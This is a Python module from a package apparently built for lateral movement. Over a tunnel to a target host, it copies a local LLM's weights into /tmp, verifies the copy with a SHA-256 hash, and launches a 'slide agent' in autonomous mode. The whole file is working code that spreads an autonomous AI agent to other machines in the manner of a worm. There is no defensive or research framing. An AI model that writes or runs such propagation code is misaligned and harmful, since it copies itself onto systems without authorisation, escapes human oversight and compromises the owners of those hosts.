# sovereign_movement/slide/model_propagation.py

from __future__ import annotations
from typing import Optional, Callable
import hashlib
import logging
import os

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_engine.frame_energy import FrameEnergy

logger = logging.getLogger("sovereign.slide.model_propagation")
ProgressCallback = Callable[[int, int, float], None]


class ModelPropagation:
    def __init__(
        self,
        tunnel_manager: SovereignTunnel,
        frame_energy: Optional[FrameEnergy] = None,
        model_path: str = "models/quantized/",
        default_model: str = "qwen2.5-coder-32b-q4_k_m.gguf",
        remote_model_dir: str = "/tmp/slide_models/",
    ):
        self.tunnel_manager = tunnel_manager
        self.frame_energy = frame_energy
        self.model_path = model_path
        self.default_model = default_model
        self.remote_model_dir = remote_model_dir

    def propagate_to_host(
        self,
        target_host: str,
        tunnel_id: str,
        activate_agent: bool = True,
        transfer_model: bool = True,
        progress_callback: Optional[ProgressCallback] = None,
    ) -> bool:
        logger.info(f"[Phase 4] Starting ingestion on {target_host}")

        success = True
        if transfer_model:
            if not self._transfer_model_weights(target_host, tunnel_id, progress_callback):
                success = False

        if activate_agent and success:
            if not self._activate_remote_slide_agent(target_host, tunnel_id):
                success = False

        return success

    def _transfer_model_weights(self, target_host: str, tunnel_id: str,
                                progress_callback: Optional[ProgressCallback] = None) -> bool:
        local_path = os.path.join(self.model_path, self.default_model)
        remote_path = os.path.join(self.remote_model_dir, self.default_model)

        if not os.path.exists(local_path):
            return False

        local_hash = self._compute_file_hash(local_path)
        self.tunnel_manager.execute_command(tunnel_id, f"mkdir -p {self.remote_model_dir}")

        if not self.tunnel_manager.send_file(tunnel_id, local_path, remote_path, progress_callback):
            return False

        remote_hash = self._verify_remote_file_hash(tunnel_id, self.default_model)
        return remote_hash == local_hash if remote_hash else False

    def _compute_file_hash(self, path: str) -> Optional[str]:
        sha = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha.update(chunk)
        return sha.hexdigest()

    def _verify_remote_file_hash(self, tunnel_id: str, filename: str) -> Optional[str]:
        path = os.path.join(self.remote_model_dir, filename)
        result = self.tunnel_manager.execute_command(tunnel_id, f"sha256sum {path} | awk '{{print $1}}'")
        return result.stdout if result.success else None

    def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
        cmd = f"python3 -m sovereign_movement.slide.slide_agent --host {target_host} --mode autonomous"
        result = self.tunnel_manager.execute_command(tunnel_id, cmd)
        return result.success